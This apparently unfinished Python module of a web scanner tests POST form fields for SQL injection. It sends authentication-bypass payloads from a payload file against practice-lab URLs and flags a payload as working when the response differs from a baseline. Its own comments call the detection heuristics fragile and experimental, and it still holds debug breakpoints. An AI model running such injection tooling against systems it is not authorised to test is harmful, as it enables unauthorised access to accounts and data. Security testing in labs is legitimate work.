import requests
from bs4 import BeautifulSoup

from library import make_request, make_results_obj

"""
Things to do:
1. Check if server is using MySQL or SQLite (is this needed? Or just bruteforce)
2. Have a way to diff the two web responses
3. Include logging - details about endpoints discovered and crawled (print for now)
4. Send network requests GET, POST
"""

def html_escape(text):
    """Produce entities within text."""
    html_escape_table = {
      "&": "&amp;",
      '"': "&quot;",
      "'": "&apos;",
      ">": "&gt;",
      "<": "&lt;",
    }
    return "".join(html_escape_table.get(c,c) for c in text)

def extract_post_fields(link, soup):
  # Finds all possible SQL injection points present on the page
  # Returns { post_url: [list of fields] }
  post_dct = {}
  field_lst = []
  for form in soup.find_all('form'):
    if form.get('method') == "POST":
      # Extract the URL that the <form> is POSTing to
      post_url = link if not form.get('action') else link+form.get('action')
      # Extract the injectable HTML elements present in the <form>
      for child in form.find_all(recursive=False):
        # Ignore submit/image with no name attribute
        if child['type'] in ('submit', 'image') and not child.has_attr('name'):
            continue
        if child['type'] in ('text', 'hidden', 'password', 'submit', 'image'):
            # Extract the <input> name attribute
            field_lst.append(child['name'])
  post_dct[link] = field_lst
  if post_dct:
    print("[*] Injection points found. Iterating payloads...")
  return post_dct

def find_baseline(injection_obj):
  # Follow a simple flowchart to see if a baseline file can be determined
  # Returns the baseline_file. "" if baseline does not exist

  method, link, params, cookie = injection_obj
  if link == "http://192.168.56.101/sqli/example5.php":
    import pdb; pdb.set_trace()

  # Send a request with long garbage string (lower the chances that the page 
  # originally contains our POST data)
  res1 = make_request(injection_obj, 'b1946ac92492d2347c6235b4d2611184').content
  res2 = make_request(injection_obj, '91fc14ad02afd60985bb8165bda320a6').content
  # If the input data does not affect the response, it means that whatever 
  # response we get is the baseline
  if res1 == res2:
    return res1
  else:
    # How to handle cases where they say "<input> cannot be found"
    # i.e. <input> is echoed back to the user
    if 'b1946ac92492d2347c6235b4d2611184' in res1:
      return ""

def inject_payload(injection_obj, payload, baseline):
  # import pdb; pdb.set_trace()
  method, link, params, cookie = injection_obj
  # if link == 'http://localhost:8888/openredirect/openredirect.php':
  #   import pdb; pdb.set_trace()
  res = make_request(injection_obj, payload)
  if payload == "'-'\n" and link == "http://192.168.56.101/sqli/example5.php":
    import pdb; pdb.set_trace()
  if baseline:
    if res.content != baseline:
      print("[*] Working payload found!")
      print(injection_obj, payload)
      return make_results_obj(injection_obj, payload)
  else:
    # TODO: this might be a fragile assumption!
    # Making the assumption that if the injection worked, the <input> will NOT 
    # be echoed back to the user. 
    # Note: payload.strip() MIGHT result in some cases not being caught?
    # TODO: this heuristic below is experimental!
    if html_escape(payload.strip()) in res.content or payload.strip() in res.content:
      pass
    else:
      print("[*] Working payload found!")
      print(injection_obj, payload)
      return make_results_obj(injection_obj, payload)

def iterate_payloads(injection_obj_lst):
  results = []
  for injection_obj in injection_obj_lst:
    method, link, params, cookie = injection_obj
    for param in params:
      baseline = find_baseline(injection_obj)
      payloads = open('payloads/Auth_Bypass.txt').readlines()
      for payload in payloads:
        result = inject_payload(injection_obj, payload, baseline)
        if result:
          results.append(result)
          break
  return results

def run(injection_obj_lst):
  print("[*] Testing for SQL Injection")
  results = iterate_payloads(injection_obj_lst)
  return results